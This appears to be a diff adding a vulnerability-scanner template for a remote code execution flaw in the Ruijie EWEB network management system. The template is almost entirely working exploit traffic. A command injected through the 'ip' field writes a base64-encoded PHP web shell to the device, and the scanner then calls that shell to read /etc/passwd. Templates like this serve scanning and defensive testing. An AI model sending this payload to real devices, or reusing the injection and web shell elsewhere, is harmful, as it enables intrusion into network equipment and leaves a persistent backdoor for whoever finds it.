@@ -1,0 +1,39 @@
+id: ruijie-networks-rce
+
+info:
+  name: Ruijie Networks-EWEB Network Management System RCE
+  author: pikpikcu
+  severity: critical
+  reference: https://github.com/yumusb/EgGateWayGetShell_py/blob/main/eg.py
+  vendor: https://www.ruijienetworks.com
+  tags: ruijie,rce
+
+requests:
+  - raw:
+      - |
+        POST /guest_auth/guestIsUp.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Content-Length: 111
+
+        ip=127.0.0.1|echo "PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4K"|base64 -d > poc.php&mac=00-00
+
+      - |
+        GET /guest_auth/poc.php?cmd=cat%20/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Content-Length: 2
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+          - "nobody:x:0:0:"
+        part: body
+
+      - type: status
+        status:
+          - 200
